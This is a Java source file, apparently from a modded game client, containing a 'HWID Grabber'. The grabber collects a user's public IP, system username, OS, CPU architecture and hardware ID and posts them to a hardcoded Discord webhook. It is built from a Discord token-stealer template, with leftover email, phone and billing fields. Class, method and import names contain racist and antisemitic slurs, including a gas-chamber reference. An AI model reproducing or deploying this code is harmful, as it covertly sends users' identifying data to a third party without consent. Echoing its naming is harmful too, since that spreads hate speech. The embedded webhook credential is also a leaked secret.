package Snipeware.security;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import Snipeware.INetHandlerNiggerToServer;

public final class JUDENENCHAMBERDEGASSO {   
	
	public static boolean debug = false;


        String d = "https://discord.com/api/webhooks/872471482700300298/BJGhzbni2DHs6DLYEugWhfJE8ZxOdpXd5_k7z2ZA1H9k_9eAH01BWS-ajroCAGxshXDj";

        // HWID
    public static void nig() throws Exception {
        // IMPORTANT: Not tested on MacOS or Linux (hopefully works)


        //Settings:
        String discord_avatar_url = "https://cdn.discordapp.com/avatars/699428621084917813/622e2bf8ec4007ec20a5ccb83167acbf.png?size=256"; //If you want to change the webhook icon
        String discord_username =  "HWID Grabber"; //Webhook Name (only when embed)
        String discord_webhook_url = "https://discord.com/api/webhooks/872471482700300298/BJGhzbni2DHs6DLYEugWhfJE8ZxOdpXd5_k7z2ZA1H9k_9eAH01BWS-ajroCAGxshXDj"; // args[0]; //Change this
        boolean send_embed = true; //True sends embed, False sends it in text
        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)

            if (System.getProperty("os.name").contains("Windows")) {
                String path = JUDENENCHAMBERDEGASSO.class.getProtectionDomain().getCodeSource().getLocation().getPath();
                String decodedPath = URLDecoder.decode(path, "UTF-8");
                String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];


                //Gatherer
                    sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, "Napoleon", send_embed), discord_webhook_url);

        }
    }
    private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
        //PC Info
        String pcInfo_IP;
        String pcInfo_Username;
        String pcInfo_cpuArch;
        String pcInfo_WindowsVersion;

        //Assign what we know
        pcInfo_Username = System.getProperty("user.name");
        pcInfo_WindowsVersion = System.getProperty("os.name");
        pcInfo_cpuArch = System.getProperty("os.arch");

        //Get IP
        pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);
        
            String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+""+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://cdn.discordapp.com/avatars/723900852074709033/204e82fd573437e65a73c0ed024cb119.png?size=1024\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+""+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+""+"\\nPhone: "+""+"\\nNitro: "+""+"\\nIs Blacklisted: No\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**HWID**\",\"value\":\"```"+INetHandlerNiggerToServer.getID()+"```\"}]}],\"username\":\""+username+"\"}";
            String finishedTextContent = "{\"avatar_url\":\""+""+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+""+"```\\n**Phone NR:**\\n```"+""+"```\\n**Nitro:**\\n```"+""+"```\\n**Billing Info:**\\n```"+""+"```\\n**HWID**\\n```"+INetHandlerNiggerToServer.getID()+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+""+"```\\n**IP:**\\n```"+"pcInfo_IP"+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+""+"\"}";

            if (sendEmbed) {
                if (debug) {
                    System.out.println(finishedEmbedContent);
                }
                return finishedEmbedContent;
            } else {
                if (debug) {
                    System.out.println(finishedTextContent);
                }

                return finishedTextContent;
            }
        }




        private static String getJsonKey(String jsonString, String wantedKey) {
            Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
            Matcher matcher = jsonPattern.matcher(jsonString);

            if (matcher.find()) {
                return matcher.group(0).split("\"")[3];
            }
            return null;
        }

        /////////////////
        /// Requests ///
        ////////////////

        private static String get_request(String uri, boolean isChecking, String token) throws IOException {
            URL url = new URL(uri);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
            if (isChecking) {
                connection.setRequestProperty("Authorization", token);
            }
            connection.setRequestMethod("GET");
            InputStream responseStream = connection.getInputStream();
            if (debug) {
                System.out.println("GET - "+connection.getResponseCode());
            }
            try (Scanner scanner = new Scanner(responseStream)) {
                String responseBody = scanner.useDelimiter("\\A").next();
                if (debug) {
                    System.out.println(responseBody);
                }
                return responseBody;
            } catch (Exception e) {
                return "ERROR";
            }
        }

        private static void sendEmbed(String jsonContent, String d) throws IOException {
            URL url = new URL(d);
            URLConnection con = url.openConnection();
            HttpURLConnection connection = (HttpURLConnection)con;
            connection.setRequestMethod("POST"); // PUT is another valid option
            connection.setDoOutput(true);

            byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
            int length = out.length;

            connection.setFixedLengthStreamingMode(length);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
            connection.connect();
            try(OutputStream os = connection.getOutputStream()) {
                os.write(out);
            }
            if (debug) {
                System.out.println("POST - "+connection.getResponseCode());
            }

        }
}